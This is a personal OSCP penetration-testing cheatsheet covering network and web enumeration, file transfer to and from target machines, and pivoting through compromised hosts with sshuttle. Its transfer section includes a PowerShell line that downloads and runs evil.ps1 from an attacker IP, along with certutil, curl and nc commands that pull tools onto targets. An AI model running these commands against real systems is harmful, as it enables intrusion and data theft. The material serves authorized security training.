+++
tags = ["blog", "cheatsheet", "hacking", "linux", "windows", "exfiltration", "privilegeescalation"]
title = "Hacki"
images = ["https://ceso.github.io/images/htb/ai/ai-header.jpg"]
description = "My humble cheatsheet of most used tools, webs, etc"
toc = true
+++

# Intro
Well, just finished my 90 days journey of OSCP labs, now here is my cheatsheet of it (and of hacking itself), I will be adding stuff in an incremental way as I go having time and/or learning new stuff.
But this is basically the tools I tend to relie and use in this way the most.
Hope is helpfull for you!

# Enumeration

## Network sniffing (using NMAP)
I tend to run 3 nmaps, an initial one, a full one and an UDP one, all of them in parallel:
```console
nmap -sV -O --top-ports 50 --open -oA nmap/initial <ip or cidr>
nmap -sC -sV -O --open -p- -oA nmap/full <ip or cidr>
nmap -sU -p- -oA nmap/udp <ip or cidr>

--top-ports only scan the N most common ports
--open only show open ports
-sC use the default scripts
-sV detect versions
-O detect Operating Systems
-p- scan all the ports
-oA save the output in normal format, grepable and xml
-sU scan UDP ports
```

Is also possible to specify scripts or ports:
```console
nmap --scripts vuln,safe,discovery -p 443,80 <ip or cidr>
```

If there are servers that could be not answering (ping), then add the flag -Pn (example of initial one):
```console
nmap -Pn --top-ports 50 --open -oA nmap/initial <ip or cidr>
```

## Web directorie/file scanner

### Gobuster
Scan all the directories/files by extension:
```console
Syntax: gobuster dir -u http://<ip or hostname> -w /path/to/dictionary -x <extension, extension> -o webscan/gobuster
Example: gobuster dir -u http://192.168.24.24 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,py -o webscan/gobuster-extensions
```

For scanning without extensions, just take out the -x

### Nikto
Sometimes Nikto shows juicy information, I tend to run it like:
```console
Syntax: nikto -Format txt -o webscan/nikto-initial -host http://<hostname or ip> -p <port>
Example: nikto -Format txt -o webscan/nikto-initial -host http://192.168.24.24 -p 8080
```

### fuff
Web fuzzer, [you can get fuff here](https://github.com/ffuf/ffuf), it basically bruteforces the dirs.
```console
Syntax: ffuf -w /path/to/wordlist -u http://<ip or hostname/FUZZ
Example: ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://192.168.24.24/FUZZ
```

## Samba
### smbclient 
Check if there is anonymous login enabled:
```console
Syntax: smbclient -L <ip or hostname>
Example: smbclient -L 192.168.24.24
```
### smbmap
Check which permissions we have in those shares (if there are):
```console
Syntax: smbmap -H <ip or hostname>
Example: smbmap -H 192.168.24.24

If we have a user, will be like the following:
smbmap -u <username> -H <ip or hostname>
```
### Version (NMAP didn't detect it)
Sometimes nmap doesn't show the version of Samba in the remote host, if this happens, a good way to know which version the remote host is running, is to capture traffic with wireshark against the remote host on 445/139 and in parallel run an smbclient -L, do a follow tcp stream and with this we might see which version the server is running.

{{< image src="/images/cheatsheet/smb-version-wireshark.png" position="center" style="border-radius: 8px;" >}}

# Exfiltration

## Samba
Generate a samba server with Impacket:

```console
Syntax: impacket-smbserver <share-name> <path-to-share>
Example: impacket-smbserver tools /home/kali/tools
```
### Mount from Windows
Mounting it in Windows with Powershell:
```console
Syntax: New-PSDrive -Name <share-name> -PSProvider "Filesystem" -Root <\\ip-hare\share-name>"
Example: New-PSDrive -Name "tools" -PSProvider "Filesystem" -Root "\\192.168.42.42\tools"
```
Mounting it without Powershell:

```console
Syntax: net use <letterdisk> <\\ip-share\share-name>
Example: net use z: \\192.168.42.42\tools"
```

On windows, to list mounted shares, either Powershell or without it:
```console
Powershell: Get-SMBShare
Without Powershell: net share
```
### Mount from Linux
Is needed to have installed cifs-utils, to install it (in debian based):
```console
sudo apt-get install cifs-utils
```

To mount it:
```console
Syntax: sudo mount -t cifs //ip-share/share-name /path/to/mount
Example: sudo mount -t cifs //192.168.42.42/tools ~/my_share/
```

To list mounted shares:
```
mount | grep cifs
grep cifs /proc/mount
```

## HTTP
From your local attacker machine, create a http server with:
```console
sudo python3 -m http.server 80
sudo python2 -m SimpleHTTPServer 80
```

It's also possible to specify which path to share, for example:
```console
sudo python3 -m http.server 80 --dir /home/kali/tools
```

### Download from Windows
There are two ways to download the files, with Powershell or without, those are with Powershell:
```console
Syntax: iex(new-object net.webclient).downloadstring("http://<hostname or ip>/path/is/the/file")
Example" iex(new-object net.webclient).downloadstring("http://192.168.42.42/evil.ps1)
```

Without powershell
```console
Syntax: certutil.exe -urlcache -split -f "http://<hostname or ip>/path/to/file" name-save-file
Example: certutil.exe -urlcache -split -f "http://192.168.42.42/nc.exe" nc.exe
```

### Download from Linux
There way more ways than in windows, so I will just put 1 using curl, you can look for example at wget for alternative ways:
```console
Syntax: curl http://<hostname or ip>/path/to/file --output name-of-file
Example: curl http://192.168.42.42/evil.php --output evil.php
```

## FTP
If there is an ftp server which we have access, we can upload files there through it, the syntax is the same for both, windows or linux:
```console
Connect and login with:
Syntax: ftp ip
Example: ftp 192.168.42.42
```

Upload the files with:
```console
Syntax: put <file>
Example: put evil.py

Sometimes is needed to enter in passive mode before doing anything, if is the case, just type
pass
followed by enter
```

## Sockets
Using nc/ncat is possible to create as a listener to upload/download stuff through them, the syntax for nc and ncat is basically the same.

Create the socket with:
```console
Syntax: nc -lvnp <port> < file-to-upload
Example: nc -lvnp 443 < evil.php

For both cases from windows, the only difference is to write nc.exe
```

And download it with:
```console
Syntax: nc -v <ip> <port> > file-to-download
Example: nc -v 192.168.42.42 443 > evil.php
```

## RDP
If we have access to a windows machine with a valid user/credentials and this user is in the "Remote Desktop Users", we can share a local directorie as a mount volume through rdp itself once we connect to the machine:
```console
Syntax: rdesktop -g <resolution> -r disk:<name-share>=<local path dir. to share> <ip or hostname> -u <username> -p -
Example: rdesktop -g 1600x800 -r disk:tmp=/usr/share/windows-binaries 192.168.30.30 -u pelota -p -
```

# Pivoting
It's possible to do pivoting by using proxychains, pure nc's or in case of linux just some fifo files (I will write them down this another methods down maybe in a future), I have used during all the OSCP an awesome tool called (sshuttle)[https://github.com/sshuttle/sshuttle] (it's a transparent proxy server that works like "a vpn", and doesn't require with super rights, only thing needed is that the bastion server you will use, needs to have installed python) and sometimes some SSH Forwarding.

## sshuttle
### One hop
Let's say we are in an intranet and we have compromised a firewall that gives us access to the management net (fw.example.mgmt - ips 192.168.20.35 and 192.168.30.253 as the management ip), by using sshuttle we can create a "vpn" to talk directly to those servers, for that, we use:
```console
Syntax: sshuttle user@<ip>:<port if not 22> <cidr-remote-net>
Example: sshuttle ceso@192.168.20.35 192.168.30.0/24
```

### Multi-hops
Now imagine that after we broke up into the management net after some some enumeration, we ended to compromise a machine that has also access to a production environment (foreman.example.mgmt - ips 192.168.30.40 and 192.168.25.87), we can take advantage of sshuttle + ProxyCommand of ssh to create a "vpn" through this multiple hops, so...putting it down, this will be kind of as follow (the diagram is extremly simplified and just for the sake of illustrate this visually, so it doesn't intend to provide a 100% precise network diagram):

{{< image src="/images/cheatsheet/multiple-hop-sshuttle.png" position="center" style="border-radius: 8px;" >}}

To have that working, is needed to put the next conf in your ssh conf file (normally ~/.ssh/config. It's based on the example above, but is easy to extrapolate to different scenarios):

```console
Host fw.example.mgmt
  Hostname 192.168.20.35
  User root
Host foreman.example.mgmt
  Hostname 192.168.30.40
  User root
  ProxyCommand ssh -W %h:%p fw.example.mgmt
  ```

  And now to setup the "multiple hop vpn", run:
  ```console
  sshuttle -r foreman.example.mgmt -v 192.168.25.0/24 &
  ```